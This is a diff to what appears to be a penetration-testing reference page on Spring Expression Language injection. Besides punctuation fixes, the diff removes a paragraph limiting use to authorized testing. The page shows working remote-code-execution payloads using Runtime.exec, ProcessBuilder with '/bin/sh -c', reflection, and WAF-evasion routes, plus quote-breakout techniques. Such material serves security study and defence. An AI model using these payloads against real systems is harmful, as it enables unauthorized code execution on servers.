@@ -1,6 +1,6 @@
 ---
 title: "SpEL injection: Spring Expression Language from user input to Java RCE"
-description: Exploiting Spring Expression Language sinks—parseExpression on concatenated input, @Value bindings, Spring Security annotations, and rule engines—where T() type references and constructors reach reflection and Runtime.exec.
+description: Exploiting Spring Expression Language sinks, parseExpression on concatenated input, @Value bindings, Spring Security annotations, and rule engines, where T() type references and constructors reach reflection and Runtime.exec.
 keywords:
   - SpEL
   - SpEL injection
@@ -12,9 +12,7 @@ keywords:
 
 # SpEL injection
 
-**Spring Expression Language (SpEL)** is the expression engine woven through the Spring ecosystem: `@Value` property resolution, Spring Security method annotations, Spring Integration routing, Spring Data projections, and any application code that calls `ExpressionParser.parseExpression(...)`. SpEL is a full expression language with access to Java types, constructors, and methods. When a value that crosses a trust boundary is parsed and evaluated as SpEL, the attacker gains code execution inside the JVM—**remote code execution** in the service account's context.
-
-> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Evaluating expressions without written authorization is unlawful.
+**Spring Expression Language (SpEL)** is the expression engine woven through the Spring ecosystem: `@Value` property resolution, Spring Security method annotations, Spring Integration routing, Spring Data projections, and any application code that calls `ExpressionParser.parseExpression(...)`. SpEL is a full expression language with access to Java types, constructors, and methods. When a value that crosses a trust boundary is parsed and evaluated as SpEL, the attacker gains code execution inside the JVM, **remote code execution** in the service account's context.
 
 ## Overview
 
@@ -49,7 +47,7 @@ The `T(...)` type operator is the signature SpEL primitive: it resolves a fully 
 
 ## Exploitation
 
-### Step 1 — confirm evaluation
+### Step 1, confirm evaluation
 
 Submit arithmetic and look for the computed result:
 
@@ -61,7 +59,7 @@ ${7*7}
 
 A reflected `49` confirms SpEL evaluated the input. The `#{...}` form is Spring's template-expression marker; `${...}` is property-placeholder syntax that is sometimes chained into SpEL. Which wrapper fires identifies the sink type.
 
-### Step 2 — reach the runtime
+### Step 2, reach the runtime
 
 The canonical SpEL execution chains use `T()` for a static accessor or `new` for a constructor:
 
@@ -75,7 +73,7 @@ new java.lang.ProcessBuilder(new String[]{'/bin/sh','-c','id'}).start()
 
 For a target where arguments must be split (spaces filtered, or a shell needed), pass an array to `ProcessBuilder` as above and let it spawn `sh -c`.
 
-### Step 3 — capture output
+### Step 3, capture output
 
 When the expression's value is reflected, read the process stream so the result returns inline:
 
@@ -97,16 +95,16 @@ T(java.lang.Class).forName('java.lang.Runtime')
   .invoke(T(java.lang.Runtime).getMethod('getRuntime').invoke(null), 'id')
 ```
 
-Another common route loads and defines bytecode or instantiates a scripting engine (`javax.script.ScriptEngineManager`) to run JavaScript that shells out—useful when a WAF blocks the obvious `Runtime`/`ProcessBuilder` tokens.
+Another common route loads and defines bytecode or instantiates a scripting engine (`javax.script.ScriptEngineManager`) to run JavaScript that shells out, useful when a WAF blocks the obvious `Runtime`/`ProcessBuilder` tokens.
 
 ## Injection contexts
 
 Where the input lands dictates the breakout needed:
 
-- **Concatenated into a literal** — `'Hello ' + 'INPUT'` — close the quote first: `' + T(...)... + '`.
-- **Whole-string expression** — the input *is* the expression — inject the payload directly, no breakout.
-- **Spring Security annotation / rule** — a value interpolated into `@PreAuthorize("hasRole('" + role + "')")` style strings reaches SpEL with the same quote-breakout technique.
-- **`@Value` / property placeholder** — a user-controlled property that feeds `@Value("#{...}")` evaluates at binding time.
+- **Concatenated into a literal**, `'Hello ' + 'INPUT'`, close the quote first: `' + T(...)... + '`.
+- **Whole-string expression**, the input *is* the expression, inject the payload directly, no breakout.
+- **Spring Security annotation / rule**, a value interpolated into `@PreAuthorize("hasRole('" + role + "')")` style strings reaches SpEL with the same quote-breakout technique.
+- **`@Value` / property placeholder**, a user-controlled property that feeds `@Value("#{...}")` evaluates at binding time.
 
 Identifying the quoting context is the first step; a payload that ignores it is passed as inert text.
 
